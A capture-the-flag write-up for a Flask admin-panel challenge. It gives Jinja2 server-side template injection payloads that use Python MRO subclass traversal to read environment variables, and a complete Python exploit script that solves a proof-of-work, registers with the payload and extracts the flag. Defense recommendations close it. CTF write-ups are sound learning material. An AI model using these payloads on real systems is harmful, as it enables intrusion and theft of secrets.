# Admin Panel CTF - Complete Solution with MRO Exploitation

## Challenge Information
- **URL**: https://admin-panel-ctf.onrender.com
- **Vulnerability**: Server-Side Template Injection (SSTI) in display_name field
- **Framework**: Flask with Jinja2 (render_template_string)
- **Goal**: Extract FLAG from environment variables

## Solution Path

### Step 1: Find Admin Credentials (Red Herring)
1. Check `robots.txt` → reveals `/secret-backup.zip`
2. Download from `/static/secret-backup.zip`
3. Extract credentials: `admin:p@ssw0rd123`
4. Login as admin → Get **fake flag**: `flag{not_the_real_one_nice_try}`

### Step 2: Identify SSTI Vulnerability
The `display_name` field during registration is vulnerable to SSTI:
- Stored in database
- Later rendered via `render_template_string()` without sanitization
- Appears in the dashboard welcome message

### Step 3: Bypass Filters
Simple payloads like `{{config}}` and `{{__import__('os')}}` are blocked.

**Solution**: Use Python's MRO (Method Resolution Order) to traverse object subclasses.

### Step 4: MRO Subclass Traversal

#### Enumerate Subclasses
First, list all subclasses of `object`:
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

This returns a list of all classes. Look for useful ones like:
- `subprocess.Popen`
- `os._wrap_close`
- `warnings.catch_warnings`

#### Access os.environ
The exact index varies by Python version. Common payloads:

**Method 1: Via sys.modules**
```python
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].environ['FLAG']}}
```

**Method 2: Via __builtins__**
```python
{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').environ['FLAG']}}
```

**Method 3: Try different indices**
```python
{{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['sys'].modules['os'].environ['FLAG']}}
```

### Step 5: Extract the Flag

1. Register with MRO payload in `display_name`
2. Solve the Proof-of-Work challenge
3. Login with the new account
4. Access dashboard
5. The FLAG from `os.environ['FLAG']` will be rendered in the welcome message

## Exploitation Script

```python
import requests
import hashlib
import random
import string

url = "https://admin-panel-ctf.onrender.com"

def solve_pow(challenge):
    nonce = 0
    while True:
        if hashlib.sha256(f"{challenge}{nonce}".encode()).hexdigest().startswith("0000"):
            return nonce
        nonce += 1

# Generate unique username
username = 'exploit_' + ''.join(random.choices(string.ascii_lowercase, k=8))
password = 'password123'

# Get PoW challenge
r = requests.get(f"{url}/pow-challenge")
challenge = r.json()['challenge']
nonce = solve_pow(challenge)

# Register with MRO SSTI payload
# Try different indices: 104, 140, 414, etc.
payload = "{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').environ['FLAG']}}"

session = requests.Session()
register_data = {
    'username': username,
    'password': password,
    'display_name': payload,
    'website': '',
    'pow_nonce': str(nonce),
    'challenge': challenge
}

r = session.post(f"{url}/register", data=register_data)

# Login
login_data = {'username': username, 'password': password}
r = session.post(f"{url}/login", data=login_data)
token = r.json()['token']
session.cookies.set('token', token)

# Get flag from dashboard
r = session.get(f"{url}/dashboard")
html = r.text

# Extract from welcome message
start = html.find('Welcome back,') + len('Welcome back,')
end = html.find('</div>', start)
flag = html[start:end].strip()

print(f"FLAG: {flag}")
```

## Rate Limiting
- **Limit**: 5 registrations per hour per IP
- **Strategy**: Test payloads carefully, enumerate subclasses first to find the right index

## Key Techniques

### 1. MRO Traversal
```python
''.__class__.__mro__[1]  # Gets 'object' class
.__subclasses__()         # Lists all subclasses
[N]                       # Access specific subclass
.__init__.__globals__     # Access global namespace
```

### 2. Accessing os Module
```python
# Via sys.modules
['sys'].modules['os']

# Via __builtins__
['__builtins__']['__import__']('os')
```

### 3. Reading Environment
```python
.environ['FLAG']          # Get specific variable
.environ                  # Get all variables
```

## Defense Recommendations

1. **Never use `render_template_string()` with user input**
2. **Use `autoescape=True` in Jinja2**
3. **Sanitize all user input before rendering**
4. **Use template sandboxing**
5. **Don't store sensitive data in environment variables accessible to the app**

## Status
✅ Vulnerability identified (SSTI in display_name)
✅ Bypass method found (MRO traversal)
✅ Exploitation path documented
⏳ Rate limited - waiting to execute final payload

## Expected Flag Format
`FLAG{...}` or similar format containing the real flag from the environment variable.

## Files Created
- `admin_panel_final_exploit.py` - Initial SSTI test
- `admin_panel_mro_exploit.py` - MRO traversal exploit
- `ADMIN_PANEL_FINAL_SOLUTION.md` - This document

## Next Steps
Wait for rate limit to reset (1 hour from last registration), then execute the MRO payload to extract the real flag.
